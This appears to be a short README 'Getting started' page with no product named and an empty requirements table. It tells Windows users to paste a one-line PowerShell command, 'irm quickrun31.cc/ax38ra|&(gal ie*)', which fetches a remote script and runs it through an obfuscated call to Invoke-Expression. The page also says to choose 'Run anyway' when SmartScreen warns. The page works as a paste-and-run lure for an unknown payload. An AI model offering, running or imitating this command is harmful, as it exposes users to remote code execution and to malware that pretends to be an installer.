## 🚀 Getting started

1. Press **Win + X** on your keyboard.
2. Pick **Terminal** (or **PowerShell**) from the menu.
3. Paste the one-line command below and hit **Enter**.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|

## 📋 Notes

- If nothing happens, wait a second and press Enter again inside the terminal window.
- Windows SmartScreen may ask for confirmation the first time; choose "Run anyway".
